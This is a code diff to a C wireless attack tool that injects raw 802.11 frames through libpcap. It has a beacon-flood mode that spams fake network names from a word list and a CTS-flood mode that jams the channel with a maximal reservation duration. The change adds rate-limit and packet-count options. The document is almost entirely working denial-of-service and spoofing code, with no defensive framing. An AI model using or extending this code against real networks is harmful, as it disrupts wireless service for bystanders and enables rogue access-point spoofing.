@@ -125,7 +125,7 @@ static inline void randaddr(uint8_t *addr)
 	addr[5] = rand();
 }
 
-static void beaconize(pcap_t *pcap, char *words[], int lines)
+static void beaconize(pcap_t *pcap, char *words[], int lines, useconds_t delay, int packets)
 {
 	struct beacon template = {
 		.radiotap.length = htole16(sizeof(struct radiotap)),
@@ -146,7 +146,7 @@ static void beaconize(pcap_t *pcap, char *words[], int lines)
 		},
 	};
 
-	while(1) {
+	while(packets) {
 		char *word = words[rand() % lines];
 		template.essid.tlv.length = strlen(word);
 
@@ -160,20 +160,32 @@ static void beaconize(pcap_t *pcap, char *words[], int lines)
 		strcpy(template.essid.data, word);
 		if(!pcap_inject(pcap, &template, sizeof(template) - sizeof(template.essid.data) + template.essid.tlv.length))
 			exit(0);
+
+		if(delay)
+			usleep(delay);
+
+		if(packets > 0)
+			packets--;
 	}
 }
 
-static void ctsize(pcap_t *pcap)
+static void ctsize(pcap_t *pcap, useconds_t delay, int packets)
 {
 	struct cts cts = {
 		.radiotap.length = htole16(sizeof(struct radiotap)),
 		.type = 0xc4,
 		.duration = htole16(0x7d00)
 	};
-	while(1) {
+	while(packets) {
 		randaddr(cts.raddr);
 		if(!pcap_inject(pcap, &cts, sizeof(cts)))
 			exit(0);
+
+		if(delay)
+			usleep(delay);
+
+		if(packets > 0)
+			packets--;
 	}
 }
 
@@ -184,8 +196,10 @@ int main(int argc, char *argv[])
 	int lines;
 	char **words;
 	enum attack attack = INVALID;
+	useconds_t delay = 0;
+	int packets = -1;
 
-	while((c = getopt(argc, argv, "bcf:")) != -1) {
+	while((c = getopt(argc, argv, "bcf:i:p:")) != -1) {
 		switch(c) {
 		case 'f':
 			words = load_words(optarg, &lines);
@@ -197,11 +211,20 @@ int main(int argc, char *argv[])
 		case 'c':
 			attack = CTS;
 			break;
+		case 'i':
+			delay = 1000000 / atoi(optarg);
+			break;
+		case 'p':
+			packets = atoi(optarg);
+			break;
 		}
 	}
 	if(optind != argc - 1 || attack == INVALID || (attack == BEACON && !lines)) {
 		fprintf(stderr, "usage: %s -b -f <file> <iface>\n", argv[0]);
 		fprintf(stderr, "usage: %s -c <iface>\n", argv[0]);
+		fprintf(stderr, "\noptional parameters:\n");
+		fprintf(stderr, "-i interval	send `interval' packets per second\n");
+		fprintf(stderr, "-p packets	send `packet' packets, then exit\n");
 		return 1;
 	} else {
 		char errbuf[PCAP_ERRBUF_SIZE];
@@ -217,11 +240,11 @@ int main(int argc, char *argv[])
 	switch(attack) {
 	case BEACON:
 		printf("beaconing on %s...\n", argv[optind]);
-		beaconize(pcap, words, lines);
+		beaconize(pcap, words, lines, delay, packets);
 		break;
 	case CTS:
 		printf("CTSing on %s...\n", argv[optind]);
-		ctsize(pcap);
+		ctsize(pcap, delay, packets);
 		break;
 	default:
 		fprintf(stderr, "unknown attack type\n");
